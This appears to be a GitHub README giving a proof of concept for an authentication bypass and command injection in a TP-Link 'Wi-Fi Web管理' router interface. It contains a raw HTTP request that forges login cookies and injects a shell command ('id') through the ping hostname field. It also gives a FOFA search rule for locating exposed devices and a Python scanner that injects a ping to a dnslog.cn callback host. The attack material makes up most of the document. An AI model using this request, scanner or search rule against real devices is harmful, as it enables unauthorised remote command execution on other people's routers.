# tp-link_wifi_rce
TP-link WIFI web管理认证绕过+命令执行漏洞



TP-link WIFI web管理命令执行



poc：

POST /cgi-bin/jumpto.php?class=diagnosis&page=config_save&isphp=1 HTTP/1.1
Host: ip
User-Agent: Mozilla/5.0 (Windows NT 6.2; WOW64; rv:22.0) Gecko/20100101 Firefox/22.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-cn,zh;q=0.8,en-us;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Cookie: cooLogin=1; cooUser=1
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 42

call_function=ping&iface=eth0&hostname=;id

![image](https://user-images.githubusercontent.com/42840611/130399378-1f74cd39-dc16-40ba-83ef-0f28a86257ed.png)


fofa规则：

title="Wi-Fi Web管理"





漏洞检测脚本：

`#!/usr/bin/python`
`#-*- coding:utf-8 -*-`

`import click`
`import requests`


`def title():`
    `print('+------------------------------------------')`
    `print('+  作者：quanpangshu                       ')`
    `print('+  漏洞名称：TP-Link WIFI WEB管理命令执行漏洞')`
    `print('+  使用格式:  python3 poc.py   --help       ')`
    `print('+------------------------------------------')`


`def scan(host):`
    `url = str(host)+"/cgi-bin/jumpto.php?class=diagnosis&page=config_save&isphp=1"`
    `headers = {`
        `"User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.16; rv:85.0) Gecko/20100101 Firefox/85.0",`
        `"Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",`
        `"Accept-Language": "zh-cn,zh;q=0.8,en-us;q=0.5,en;q=0.3",`
        `"Accept-Encoding": "gzip, deflate",`
        `"Content-Type": "application/x-www-form-urlencoded",`
        `"Cookie": "cooLogin=1; cooUser=1"`
    `}`
    `payload = "call_function=ping&iface=eth0&hostname= %3bping 5dsdj4.dnslog.cn"`

    try:
        rep = requests.post(url=url, headers=headers, data=payload, timeout=70, verify=False)
    except:
        print("漏洞不存在")
    if rep.status_code == 502:
        print("漏洞存在！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！请前往dnslog平台再次确认")
    else:
        print("漏洞不存在")

`@click.command()`
`@click.option("-h", "--host", help='Target URL; Example:http://ip:port。')`
`def main(host):`
    `title()`
    `scan(host)`

`if __name__ == '__main__':`
    `main()`







![image](https://user-images.githubusercontent.com/42840611/130399299-7c90b71e-c3ca-4f24-8cdb-0b6acbe7f0ff.png)


